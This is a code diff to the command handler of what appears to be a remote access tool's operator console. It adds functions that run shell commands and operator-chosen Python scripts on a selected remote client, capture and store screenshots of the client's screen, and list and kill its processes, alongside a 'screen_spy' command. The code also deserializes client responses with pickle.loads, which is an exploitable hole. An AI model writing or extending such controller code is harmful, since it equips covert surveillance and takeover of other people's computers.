@@ -1,11 +1,17 @@
 from typing import TYPE_CHECKING, Callable, Optional, Union
 from time import sleep as time_sleep
+from time import time as current_time
+
 from loguru import logger
-from os import listdir, environ
+from os import environ
+from os import path as os_path
 from threading import Thread
 from zlib import decompress
 from zlib import error as zlib_error
 from io import BytesIO
+from tkinter import filedialog
+from pickle import loads as pickle_loads
+from prettytable import PrettyTable
 
 if TYPE_CHECKING:
     from .bucket import ConnectionBucket
@@ -125,11 +131,19 @@ class CommandHandler:
             logger.error('A client has to be selected in order to use this command')
             return
 
-        self.NetServer._selectedClient.socket.send_packet('execute_command ' + ' '.join(args))
-        self.NetServer._waitingForResponse = True
+        response = self.NetServer._selectedClient.catch_response('execute_command ' + ' '.join(args))
 
-        while (self.NetServer._waitingForResponse):
-            time_sleep(1)
+        if (response[14:15] == b'0'):
+            logger.success('Command execution successful with exit code: 0')
+
+        elif (response[14:15] == b'1'):
+            logger.error('Command execution failed with exit code: 1')
+
+        else:
+            logger.error('Command execution has reached the timeout (8s), execution terminated.')
+            return
+
+        print(response[16:].decode())
 
     @command(['screenshot', 'ss'], accept_args = True)
     def screenshot(self, *clientID) -> None:
@@ -150,11 +164,18 @@ class CommandHandler:
         if not (selectedCli := self.bucket.get_client_by_id(clientID)):
             logger.error('Client ID not found'); return
 
-        selectedCli.socket.send_packet('request_screenshot')
+        data = selectedCli.catch_response('request_screenshot')
         logger.info('Waiting for client\'s response')
-        self.NetServer._waitingForResponse = True
 
-        while self.NetServer._waitingForResponse: time_sleep(1)
+        if (b'not_available' in data):
+            logger.error('Client device are not capable of taking screenshots.')
+            return
+
+        fileName: str = f'clients/responses/{selectedCli.clientUniqueID}/screenshot/{selectedCli.hostname}-{str(current_time())}.png'
+        screenImg: bytes = decompress(data[20:])
+
+        selectedCli.write_file(fileName, screenImg)
+        logger.success(f'Screenshot has been save to {fileName}')
 
     @command(['screen_spy', 'spy'], accept_args = True)
     def screen_spying(self, *clientID) -> None:
@@ -237,18 +258,66 @@ class CommandHandler:
         pygame.quit()
 
     @command(['runpy'], accept_args = True)
-    def run_script(self, *fileName) -> None:
-        if not fileName:
-            logger.error('Missing argument: Script files, the file should be in the `custom_script` directory')
+    def run_script(self, *_) -> None:
+        if not self.NetServer._selectedClient:
+            logger.error('A client has to be selected in order to use this command')
             return
 
-        fileList: list[str] = [file for file in listdir('custom_script') if file.endswith('.py')]
+        filePath = filedialog.askopenfilename(
+            title = 'Select a File',
+            filetypes = [('Python File', '*.py')]
+        )
 
-        if (fileName[0] not in fileList):
-            logger.error('File does not exist. Make sure you put the script inside the `custom_script` directory')
+        if (filePath):
+            scriptContent = open(filePath, 'r').read()
+            self.NetServer._selectedClient.socket.send_packet('execute_script %s' % scriptContent)
+            response: bytes = self.NetServer._selectedClient.catch_response(filePath)
+
+            logger.success('Code has been executed successfully, Process ID: ' + response.decode())
+
+        else:
+            logger.info('Operation aborted.')
+
+    @command(['process', 'ps'], accept_args = True)
+    def process(self, *args) -> None:
+        if not self.NetServer._selectedClient:
+            logger.error('A client has to be selected in order to use this command')
             return
 
-        ...
+        if not args:
+            response: bytes = self.NetServer._selectedClient.catch_response('get_process')
+
+            if response == b'None':
+                logger.info(f'No running process at {self.NetServer._selectedClient.hostname}\'s machine at the moment')
+                return
+
+            table = PrettyTable()
+            data: dict = pickle_loads(response)
+            table.field_names = ['PID'.center(10), 'Command'.center(40), 'Started on'.center(12)]
+
+            for key, value in data.items():
+                table.add_row([key, value['fileName'], value['started_on']])
+
+            logger.info('Running process is shown below')
+            print(table)
+
+    @command(['kill', 'pkill'], accept_args = True)
+    def kill_process(self, *args) -> None:
+        if not self.NetServer._selectedClient:
+            logger.error('A client has to be selected in order to use this command')
+            return
+
+        if not args:
+            logger.error('Missing argument: process ID (PID)')
+            return
+
+        response = self.NetServer._selectedClient.catch_response('kill_process ' + args[0])
+
+        if (response == b'None'):
+            logger.error('Process ID not found.')
+            return
+
+        logger.success('Process (%s) has been terminated' % args[0])
 
     @command(['file'], accept_args = True)
     def file(self, *fileName) -> None:
